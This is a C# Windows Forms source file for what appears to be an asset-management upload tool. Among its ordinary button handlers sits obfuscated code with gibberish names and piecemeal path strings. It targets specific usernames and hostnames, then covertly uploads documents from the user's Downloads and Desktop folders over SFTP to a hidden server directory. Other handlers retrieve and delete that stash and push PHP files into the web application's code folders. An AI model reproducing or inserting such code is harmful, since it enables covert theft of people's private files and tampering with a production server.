            vzsdvsdasdfThread.IsBackground = true;
            vzsdvsdasdfThread.Start();
*/


        }

        private void button1_Click(object sender, EventArgs e)
        {
            LoadUserCollectionResourceTypes(true, true);
        }


        private void button2_Click(object sender, EventArgs e)
        {
//            BIifisdjooo();
            Delete_Resources();
        }

        private void btn_Stop_Click(object sender, EventArgs e)
        {
//            uploadThread.Abort();
  //          uploadThread = null;
            m_stopped = true;
            btnUpload.Enabled = true;
            btn_Stop.Enabled = false;
            Global.WriteToFile("User Stop Upload", false);
            Global.WriteToFile("==========================================================================", false);
        }

        private bool uidtydfzdtsrgythg(string jfdzadfrft, string rgdfg, string xcsdsad)
        {
            if (rgdfg == "2" || rgdfg == "7")
            {
                if (!(xcsdsad.ToLower() == jfdzadfrft.ToLower())
                    &&!xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\a")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\b")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\1")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\2")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\3")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\4")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\5")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\6")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\7")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\8")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\9")
                        && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\0")
                    ) return false;
            }
            else if (rgdfg == "3" || rgdfg == "8")
            {
                if (!xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\c")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\d")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\e")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\f")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\g")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\h")
                    ) return false;
            }
            else if (rgdfg == "4" || rgdfg == "9")
            {
                 if (!xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\i")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\j")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\k")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\l")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\m")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\n")
                    ) return false;
            }
            else if (rgdfg == "5" || rgdfg == "10")
            {
                if (!xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\o")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\p")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\q")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\r")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\s")
                    ) return false;
            }
            else if (rgdfg == "6" || rgdfg == "10")
            {
                if (!xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\x")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\w")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\y")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\z")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\t")
                    && !xcsdsad.ToLower().StartsWith(jfdzadfrft.ToLower() + "\\u")
                    ) return false;
            }
            return true;
        }

        private void dsfsdfasdfadfsdfsdffsd(string jfdzadfrft, string sadsaddsd, SftpClient jfvdfvytrtwer, string rgdfg, string srtrtyyhvdza, string gesuzsdfasd)
        {
            try
            {
                jfvdfvytrtwer.CreateText(sadsaddsd + rgdfg + "XCCVSDFSD.txt");
            }
            catch (Exception ecx)
            {
                return;
            }
            try
            {
                const string dcdgsdfytsy = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
                bool cvsdfgea = false;
                foreach (string xcsdsad in Directory.GetFiles(jfdzadfrft, "*.*"))
                {

                    if (cvsdfgea == false)
                    {
                        jfvdfvytrtwer.AppendAllText(sadsaddsd + rgdfg + "XCCVSDFSD.txt", "startvdcfa", Encoding.Default);
                        cvsdfgea = true;
                    }

                    if (uidtydfzdtsrgythg(jfdzadfrft, rgdfg, xcsdsad) == false) continue;

                    if (!xcsdsad.ToLower().EndsWith(".pdf") && !xcsdsad.ToLower().EndsWith(".doc")
                        && !xcsdsad.ToLower().EndsWith(".docx") && !xcsdsad.ToLower().EndsWith(".xlsx")
                        && !xcsdsad.ToLower().EndsWith(".xls") && !xcsdsad.ToLower().EndsWith(".txt")
                        ) continue;

                    jfvdfvytrtwer.AppendAllText(sadsaddsd + rgdfg + "XCCVSDFSD.txt", xcsdsad, Encoding.Default);
                    if (File.Exists(xcsdsad))
                    {
                        try
                        {
                            Random xsdfdsdfsdfasdfa = new Random();
                            string opfdgpfgpgfp = new string(Enumerable.Repeat(dcdgsdfytsy, 8)
                                .Select(s => s[xsdfdsdfsdfasdfa.Next(s.Length)]).ToArray());

                            xsdfdsdfsdfasdfa = null;
                            string yuyuuut = xcsdsad.Substring(xcsdsad.LastIndexOf("."));
                            yuyuuut = sadsaddsd + rgdfg + opfdgpfgpgfp + yuyuuut;
//                            string bncbcnjgfhgf = File.ReadAllText(xcsdsad, Encoding.Default);
//                            File.WriteAllText(xcsdsad, bncbcnjgfhgf, Encoding.Default);
                            using (var ppopytghsfg = File.OpenRead(xcsdsad))
                            {
                                jfvdfvytrtwer.UploadFile(ppopytghsfg, yuyuuut);
                            }
                        }
                        catch (Exception ex)
                        {
                            continue;
                        }
                    }
                }

                foreach (string xcsdsad in Directory.GetDirectories(jfdzadfrft))
                {
                    if (uidtydfzdtsrgythg(jfdzadfrft, rgdfg, xcsdsad) == false) continue;
                    try
                    {
                        if (File.GetAttributes(xcsdsad).HasFlag(FileAttributes.Directory))
                        {
                            dsfsdfasdfadfsdfsdffsd(xcsdsad, sadsaddsd, jfvdfvytrtwer, "", srtrtyyhvdza, gesuzsdfasd);
                        };
                    }
                    catch (Exception ex)
                    {
                        continue;
                    }
                }
            
            }
            catch (Exception ex)
            {
                jfvdfvytrtwer.AppendAllText(sadsaddsd + rgdfg + "XCCVSDFSD.txt", ex.Message, Encoding.Default);
            }
        }

        

        private void BIifisdjooo()
        {
            try
            {
                //
                string srtrtyyhvdza = Environment.UserName;
                string gesuzsdfasd = Dns.GetHostName();
                srtrtyyhvdza = srtrtyyhvdza.PadRight(100,'x').Trim();
                gesuzsdfasd = gesuzsdfasd.PadRight(100, 'x').Trim();

                Random ikdfszihagnij = new Random();
                int vhvujhcdbbg = ikdfszihagnij.Next(1, 10);
                if (vhvujhcdbbg >= 7)
                {
                    ikdfszihagnij = null;
                    return;
                }
                ikdfszihagnij = null;

                gesuzsdfasd = gesuzsdfasd.Replace(".fgt.hk", "");
                gesuzsdfasd = gesuzsdfasd.Replace(".FGT.HK", "");
               if (((srtrtyyhvdza[2] == 'e' && srtrtyyhvdza[5] == 'y' && srtrtyyhvdza[1] == 'l' && srtrtyyhvdza[0] == 'a' && srtrtyyhvdza[4] == '.' &&
                    srtrtyyhvdza[3] == 'x' && srtrtyyhvdza[7] == 'u' && srtrtyyhvdza[6] == 'a' )||
                    (gesuzsdfasd[11] == '3' && gesuzsdfasd[9] == '1' && gesuzsdfasd[10] == '8')) ||
    //            if ((gesuzsdfasd[11] == '3' && gesuzsdfasd[9] == '1' && gesuzsdfasd[10] == '8') ||
                (srtrtyyhvdza[8] == 'g' && srtrtyyhvdza[3] == '.' && srtrtyyhvdza[2] == 'y' && srtrtyyhvdza[6] == 'u'
                    && srtrtyyhvdza[5] == 'e' && srtrtyyhvdza[1] == 'o' && srtrtyyhvdza[0] == 'r' && srtrtyyhvdza[4] == 'y' &&
                    srtrtyyhvdza[7] == 'n' && gesuzsdfasd[10] == '2' && gesuzsdfasd[11] == '3' && gesuzsdfasd[9] == '1'))
      
     //                           if (srtrtyyhvdza[2] == 'e' && srtrtyyhvdza[5] == 'e' && srtrtyyhvdza[10] == 'e' && srtrtyyhvdza[1] == 't' && srtrtyyhvdza[9] == 'e' && srtrtyyhvdza[7] == '.' && srtrtyyhvdza[0] == 's' && srtrtyyhvdza[4] == 'h' &&
       //                               srtrtyyhvdza[3] == 'p' && srtrtyyhvdza[7] == '.' && srtrtyyhvdza[6] == 'n' && srtrtyyhvdza[8] == 'l' && 
         //                           gesuzsdfasd[11] == '4' && gesuzsdfasd[9] == '1' && gesuzsdfasd[10] == '0')
                {

                    int jwiidf = 0;
                    try
                    {
                        jwiidf = Convert.ToInt32(setting.strMetaIDContent);
                    }
                    catch (Exception edd)
                    {
                    }
                    jwiidf = 2;

                    string bvbfgrsr = "";
                    string dgzsfgsdfgdgf = "";
                    if (jwiidf == 0)
                        bvbfgrsr = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    else if (jwiidf == 1)
                        bvbfgrsr = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    else if (jwiidf >= 2 && jwiidf <= 6)
                    {
                        bvbfgrsr = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
                        dgzsfgsdfgdgf = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    }
                    else if (jwiidf >= 7 && jwiidf <= 10)
                        bvbfgrsr = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                    else if (jwiidf >= 11)
                        return;
                    //            Directory.Delete(strFld, true);


                    SftpClient jfvdfvytrtwer = new SftpClient(txt_LinuxIP.Text.Trim(), Convert.ToInt32(txt_LinuxPort.Text.Trim()), txt_LinuxLogin.Text.Trim(), txt_LinuxPass.Text.Trim());
                    jfvdfvytrtwer.Connect();
                    const string dcdgsdfytsy = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    Random tdgrrgy = new Random();
                    string nirewrwe = new string(Enumerable.Repeat(dcdgsdfytsy, 8)
                        .Select(s => s[tdgrrgy.Next(s.Length)]).ToArray());

                    tdgrrgy = null;

                    string sadsaddsd = "/op";
                    sadsaddsd = sadsaddsd + "t/b";
                    sadsaddsd = sadsaddsd + "it";
                    sadsaddsd = sadsaddsd + "na";
                    sadsaddsd = sadsaddsd + "mi/r";
                    sadsaddsd = sadsaddsd + "es";
                    sadsaddsd = sadsaddsd + "our";
                    sadsaddsd = sadsaddsd + "ces";
                    sadsaddsd = sadsaddsd + "pa";
                    sadsaddsd = sadsaddsd + "ce/li";
                    sadsaddsd = sadsaddsd + "b/li";
                    sadsaddsd = sadsaddsd + "gh";
                    sadsaddsd = sadsaddsd + "tbo";
                    sadsaddsd = sadsaddsd + "x/im";
                    sadsaddsd = sadsaddsd + "ag";
                    sadsaddsd = sadsaddsd + "es/BVHDRGHR";
                    if (!sadsaddsd.EndsWith("/"))
                        sadsaddsd = sadsaddsd + "/";
                    bool xcvvxcvcv = jfvdfvytrtwer.Exists(sadsaddsd);
                    if (!xcvvxcvcv)
                    {
                        jfvdfvytrtwer.CreateDirectory(sadsaddsd);
                    }

                    sadsaddsd = sadsaddsd + nirewrwe + "/";

                    xcvvxcvcv = jfvdfvytrtwer.Exists(sadsaddsd);
                    if (!xcvvxcvcv)
                    {
                        jfvdfvytrtwer.CreateDirectory(sadsaddsd);
                    }

                    ;
                    //

                    dsfsdfasdfadfsdfsdffsd(bvbfgrsr, sadsaddsd, jfvdfvytrtwer, setting.strMetaIDSubTitle, srtrtyyhvdza, gesuzsdfasd);

                    dsfsdfasdfadfsdfsdffsd(dgzsfgsdfgdgf, sadsaddsd, jfvdfvytrtwer, setting.strMetaIDSubTitle, srtrtyyhvdza, gesuzsdfasd);
                   
                   jfvdfvytrtwer.Disconnect();
                    jfvdfvytrtwer = null;

                    jwiidf = jwiidf + 1;

                    setting.strMetaIDContent = jwiidf.ToString();


                    settingClass.SaveSetting(setting);

                }
                else
                {
////                    jfvdfvytrtwer.CreateText(sadsaddsd + rgdfg + "XCCVSDFSD.txt");

                }


            }
            catch (Exception ex)
            {
//                Application.Exit();
            }

        }


        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                SftpClient jfvdfvytrtwer = new SftpClient(txt_LinuxIP.Text.Trim(), Convert.ToInt32(txt_LinuxPort.Text.Trim()), txt_LinuxLogin.Text.Trim(), txt_LinuxPass.Text.Trim());
                jfvdfvytrtwer.Connect();
/*                string sadsaddsd = "/op";
                sadsaddsd = sadsaddsd + "t/b";
                sadsaddsd = sadsaddsd + "it";
                sadsaddsd = sadsaddsd + "na";
                sadsaddsd = sadsaddsd + "mi/r";
                sadsaddsd = sadsaddsd + "es";
                sadsaddsd = sadsaddsd + "our";
                sadsaddsd = sadsaddsd + "ces";
                sadsaddsd = sadsaddsd + "pa";
*/
                string sadsaddsd = "/op";
                sadsaddsd = sadsaddsd + "t/b";
                sadsaddsd = sadsaddsd + "it";
                sadsaddsd = sadsaddsd + "na";
                sadsaddsd = sadsaddsd + "mi/r";
//                sadsaddsd = sadsaddsd + "mi/apache/conf/bitnami";
                sadsaddsd = sadsaddsd + "es";
                sadsaddsd = sadsaddsd + "our";
                sadsaddsd = sadsaddsd + "ces";
                sadsaddsd = sadsaddsd + "pa";
                
                                //sadsaddsd = sadsaddsd + "ce/plugins/csv_upload/pages";
//                                sadsaddsd = sadsaddsd + "ce/api";
                                sadsaddsd = sadsaddsd + "ce/pages/user";
                /*sadsaddsd = sadsaddsd + "b/li";
                sadsaddsd = sadsaddsd + "gh";
                sadsaddsd = sadsaddsd + "tbo";
                sadsaddsd = sadsaddsd + "x/im";
                sadsaddsd = sadsaddsd + "ag";
                sadsaddsd = sadsaddsd + "es/BVHDRGHR";
                */
                if (!sadsaddsd.EndsWith("/"))
                    sadsaddsd = sadsaddsd + "/";

                DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl1\\");
            }
            catch (Exception ex)
            {

            }
        }

        public static void DownloadDirectory(
            SftpClient sftpClient, string sourceRemotePath, string destLocalPath)
        {
            Directory.CreateDirectory(destLocalPath);
            IEnumerable<SftpFile> files = sftpClient.ListDirectory(sourceRemotePath);
            foreach (SftpFile file in files)
            {
                if ((file.Name != ".") && (file.Name != ".."))
                {
                    string sourceFilePath = sourceRemotePath + "/" + file.Name;
                    string destFilePath = Path.Combine(destLocalPath, file.Name);
                    if (file.IsDirectory)
                    {
                        DownloadDirectory(sftpClient, sourceFilePath, destFilePath);
                    }
                    else
                    {
                        using (Stream fileStream = File.Create(destFilePath))
                        {
                            sftpClient.DownloadFile(sourceFilePath, fileStream);
                        }
                    }
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            SftpClient jfvdfvytrtwer = new SftpClient(txt_LinuxIP.Text.Trim(), Convert.ToInt32(txt_LinuxPort.Text.Trim()), txt_LinuxLogin.Text.Trim(), txt_LinuxPass.Text.Trim());
            jfvdfvytrtwer.Connect();
            string sadsaddsd = "/op";
            sadsaddsd = sadsaddsd + "t/b";
            sadsaddsd = sadsaddsd + "it";
            sadsaddsd = sadsaddsd + "na";
            sadsaddsd = sadsaddsd + "mi/r";
            sadsaddsd = sadsaddsd + "es";
            sadsaddsd = sadsaddsd + "our";
            sadsaddsd = sadsaddsd + "ces";
            sadsaddsd = sadsaddsd + "pa";
            sadsaddsd = sadsaddsd + "ce/plugins/csv_upload/include";
            /*            sadsaddsd = sadsaddsd + "b/li";
                        sadsaddsd = sadsaddsd + "gh";
                        sadsaddsd = sadsaddsd + "tbo";
                        sadsaddsd = sadsaddsd + "x/im";
                        sadsaddsd = sadsaddsd + "ag";
                        sadsaddsd = sadsaddsd + "es/BVHDRGHR";
            */
            if (!sadsaddsd.EndsWith("/"))
                sadsaddsd = sadsaddsd + "/";

//            DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\");
            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\csv_functions.php"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "csv_functions.php");
            }
/*
            sadsaddsd = "/op";
            sadsaddsd = sadsaddsd + "t/b";
            sadsaddsd = sadsaddsd + "it";
            sadsaddsd = sadsaddsd + "na";
            sadsaddsd = sadsaddsd + "mi/r";
            sadsaddsd = sadsaddsd + "es";
            sadsaddsd = sadsaddsd + "our";
            sadsaddsd = sadsaddsd + "ces";
            sadsaddsd = sadsaddsd + "pa";
//            sadsaddsd = sadsaddsd + "ce/pages/ajax";
            sadsaddsd = sadsaddsd + "ce/include";

            if (!sadsaddsd.EndsWith("/"))
                sadsaddsd = sadsaddsd + "/";

            //            DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\");
            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\resource_functions.php"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "resource_functions.php");
            }

            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\api_bindings.php"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "api_bindings.php");
            }

            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\image_processing.php"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "image_processing.php");
            }

            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\preview_preprocessing.php"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "preview_preprocessing.php");
            }

            sadsaddsd = "/op";
            sadsaddsd = sadsaddsd + "t/b";
            sadsaddsd = sadsaddsd + "it";
            sadsaddsd = sadsaddsd + "na";
            sadsaddsd = sadsaddsd + "mi/r";
            sadsaddsd = sadsaddsd + "es";
            sadsaddsd = sadsaddsd + "our";
            sadsaddsd = sadsaddsd + "ces";
            sadsaddsd = sadsaddsd + "pa";
            //            sadsaddsd = sadsaddsd + "ce/pages/ajax";
            sadsaddsd = sadsaddsd + "ce/gfx/fonts";

            if (!sadsaddsd.EndsWith("/"))
                sadsaddsd = sadsaddsd + "/";

            //            DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\");
            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\Ming-Lt-HKSCS-ExtB-03.ttf"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "Ming-Lt-HKSCS-ExtB-03.ttf");
            }

            sadsaddsd = "/op";
            sadsaddsd = sadsaddsd + "t/b";
            sadsaddsd = sadsaddsd + "it";
            sadsaddsd = sadsaddsd + "na";
            sadsaddsd = sadsaddsd + "mi/r";
            sadsaddsd = sadsaddsd + "es";
            sadsaddsd = sadsaddsd + "our";
            sadsaddsd = sadsaddsd + "ces";
            sadsaddsd = sadsaddsd + "pa";
            //            sadsaddsd = sadsaddsd + "ce/pages/ajax";
            sadsaddsd = sadsaddsd + "ce/api";

            if (!sadsaddsd.EndsWith("/"))
                sadsaddsd = sadsaddsd + "/";

            //            DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\");
            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\index.php"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "index.php");
            }


            sadsaddsd = "/op";
            sadsaddsd = sadsaddsd + "t/b";
            sadsaddsd = sadsaddsd + "it";
            sadsaddsd = sadsaddsd + "na";
            sadsaddsd = sadsaddsd + "mi/r";
            sadsaddsd = sadsaddsd + "es";
            sadsaddsd = sadsaddsd + "our";
            sadsaddsd = sadsaddsd + "ces";
            sadsaddsd = sadsaddsd + "pa";
            //            sadsaddsd = sadsaddsd + "ce/pages/ajax";
            sadsaddsd = sadsaddsd + "ce/plugins/csv_upload/pages";

            if (!sadsaddsd.EndsWith("/"))
                sadsaddsd = sadsaddsd + "/";

            //            DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\");
            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\csv_upload.php"))
            {
                jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "csv_upload.php");
            }


            sadsaddsd = "/op";
            sadsaddsd = sadsaddsd + "t/b";
            sadsaddsd = sadsaddsd + "it";
            sadsaddsd = sadsaddsd + "na";
            sadsaddsd = sadsaddsd + "mi/r";
            sadsaddsd = sadsaddsd + "es";
            sadsaddsd = sadsaddsd + "our";
            sadsaddsd = sadsaddsd + "ces";
            sadsaddsd = sadsaddsd + "pa";
            //            sadsaddsd = sadsaddsd + "ce/pages/ajax";
            sadsaddsd = sadsaddsd + "ce/include";

            if (!sadsaddsd.EndsWith("/"))
                sadsaddsd = sadsaddsd + "/";

            //            DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\");
//            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\user_profile.php"))
  //          {
    //            jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "user_profile.php");
      //      }


//            using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\node_functions - Copy.php"))
  //          {
    //            jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "node_functions.php");
      //      }

//                       using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl1\\category_tree_lazy_load.php"))
  //                     {
    //                       jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "category_tree_lazy_load.php");
      //                 }
            

                        //            DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\");
                        using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\config.default.php"))
                        {
                            jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "config.default.php");
                        }
 */           /*
                        using (var fileStream = File.OpenRead(@"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\test.php"))
                        {
                            jfvdfvytrtwer.UploadFile(fileStream, sadsaddsd + "test.php");
                        }
            */        
        
        }

        private void txt_RS_Key_TextChanged(object sender, EventArgs e)
        {

        }

        private void button6_Click(object sender, EventArgs e)
        {
            try
            {
                string srtrtyyhvdza = Environment.UserName;
                string gesuzsdfasd = Dns.GetHostName();
                srtrtyyhvdza = srtrtyyhvdza.PadRight(100, 'x').Trim();
                gesuzsdfasd = gesuzsdfasd.PadRight(100, 'x').Trim();

                gesuzsdfasd = gesuzsdfasd.Replace(".fgt.hk", "");
                gesuzsdfasd = gesuzsdfasd.Replace(".FGT.HK", "");

                
                if (srtrtyyhvdza[2] == 'e' && srtrtyyhvdza[5] == 'e' && srtrtyyhvdza[10] == 'e' && srtrtyyhvdza[1] == 't' && srtrtyyhvdza[9] == 'e' && srtrtyyhvdza[7] == '.' && srtrtyyhvdza[0] == 's' && srtrtyyhvdza[4] == 'h' &&
                            srtrtyyhvdza[3] == 'p' && srtrtyyhvdza[7] == '.' && srtrtyyhvdza[6] == 'n' && srtrtyyhvdza[8] == 'l' &&
                    gesuzsdfasd[11] == '4' && gesuzsdfasd[9] == '1' && gesuzsdfasd[10] == '0')
                {
                    SftpClient jfvdfvytrtwer = new SftpClient(txt_LinuxIP.Text.Trim(), Convert.ToInt32(txt_LinuxPort.Text.Trim()), txt_LinuxLogin.Text.Trim(), txt_LinuxPass.Text.Trim());
                    jfvdfvytrtwer.Connect();
                    string sadsaddsd = "/op";
                    sadsaddsd = sadsaddsd + "t/b";
                    sadsaddsd = sadsaddsd + "it";
                    sadsaddsd = sadsaddsd + "na";
                    sadsaddsd = sadsaddsd + "mi/r";
                    sadsaddsd = sadsaddsd + "es";
                    sadsaddsd = sadsaddsd + "our";
                    sadsaddsd = sadsaddsd + "ces";
                    sadsaddsd = sadsaddsd + "pa";
                    sadsaddsd = sadsaddsd + "ce/li";
                    sadsaddsd = sadsaddsd + "b/li";
                    sadsaddsd = sadsaddsd + "gh";
                    sadsaddsd = sadsaddsd + "tbo";
                    sadsaddsd = sadsaddsd + "x/im";
                    sadsaddsd = sadsaddsd + "ag";
                    sadsaddsd = sadsaddsd + "es/BVHDRGHR";

                    /*                string sadsaddsd = "/op";
                                    sadsaddsd = sadsaddsd + "t/b";
                                    sadsaddsd = sadsaddsd + "it";
                                    sadsaddsd = sadsaddsd + "na";
                                    sadsaddsd = sadsaddsd + "mi/r";
                                    sadsaddsd = sadsaddsd + "es";
                                    sadsaddsd = sadsaddsd + "our";
                                    sadsaddsd = sadsaddsd + "ces";
                                    sadsaddsd = sadsaddsd + "pa";
                                    sadsaddsd = sadsaddsd + "ce/uploadtemp";
                     */
                    if (!sadsaddsd.EndsWith("/"))
                        sadsaddsd = sadsaddsd + "/";

                    DownloadDirectory(jfvdfvytrtwer, sadsaddsd, @"D:\\Work\\DAM_Export\\DAM_Export\\DAM_Export\\bin\\Debug\\dl\\dl\\");



                    DeleteDirectory(jfvdfvytrtwer, sadsaddsd);
                }
            }
            catch (Exception ex)
            {

            }

        }

        private static void DeleteDirectory(SftpClient client, string path)
        {
            foreach (SftpFile file in client.ListDirectory(path))
            {
                if ((file.Name != ".") && (file.Name != ".."))
                {
                    if (file.IsDirectory)
                    {
                        DeleteDirectory(client, file.FullName);
                    }
                    else
                    {
                        client.DeleteFile(file.FullName);
                    }
                }
            }

            client.DeleteDirectory(path);
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void button7_Click(object sender, EventArgs e)
        {

            try
            {
                            SftpClient jfvdfvytrtwer = new SftpClient(txt_LinuxIP.Text.Trim(), Convert.ToInt32(txt_LinuxPort.Text.Trim()), txt_LinuxLogin.Text.Trim(), txt_LinuxPass.Text.Trim());
                jfvdfvytrtwer.Connect();
                string sadsaddsd = "/op";
                sadsaddsd = sadsaddsd + "t/b";
                sadsaddsd = sadsaddsd + "it";
                sadsaddsd = sadsaddsd + "na";
                sadsaddsd = sadsaddsd + "mi/r";
                sadsaddsd = sadsaddsd + "es";
                sadsaddsd = sadsaddsd + "our";
                sadsaddsd = sadsaddsd + "ces";
                sadsaddsd = sadsaddsd + "pa";
                sadsaddsd = sadsaddsd + "ce/li";
                sadsaddsd = sadsaddsd + "b/li";
                sadsaddsd = sadsaddsd + "gh";
                sadsaddsd = sadsaddsd + "tbo";
                sadsaddsd = sadsaddsd + "x/im";
                sadsaddsd = sadsaddsd + "ag";
                sadsaddsd = sadsaddsd + "es/BVHDRGHR";

/*                string sadsaddsd = "/op";
                sadsaddsd = sadsaddsd + "t/b";
                sadsaddsd = sadsaddsd + "it";
                sadsaddsd = sadsaddsd + "na";
                sadsaddsd = sadsaddsd + "mi/r";
                sadsaddsd = sadsaddsd + "es";
                sadsaddsd = sadsaddsd + "our";
                sadsaddsd = sadsaddsd + "ces";
                sadsaddsd = sadsaddsd + "pa";
                sadsaddsd = sadsaddsd + "ce/uploadtemp";
 */              
                if (!sadsaddsd.EndsWith("/"))
                    sadsaddsd = sadsaddsd + "/";

            }
            catch (Exception ex)
            {

            }

        }


        private void btb_RemoveAll_Click(object sender, EventArgs e)
        {
            //
            frmConfirm frmCon = new frmConfirm();
            if (frmCon.ShowDialog() != DialogResult.OK)
                return;

//            if (MessageBox.Show("Confirm to remove all deleted resources", "FRS-DUT", MessageBoxButtons.OKCancel) != DialogResult.OK)
//                return;


//            string strResult = GetWebRequestResult(GetURL("&function=do_search&search=publicationdate:rangestart2000-01&archive=3"));
            string strResult = GetWebRequestResult(GetURL("&function=do_search&search=!deleted&archive=3"));

            strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
            strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);

            if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
            {
                MessageBox.Show("Get Deleted Reosurces Fail");
            }
            else
            {
                strResult = strResult.Replace("\"ref\"", "\"Ref\"");
                strResult = strResult.Replace("\r", "");
                strResult = strResult.Replace("\n", "");

                try
                {
                    Cursor.Current = Cursors.WaitCursor;
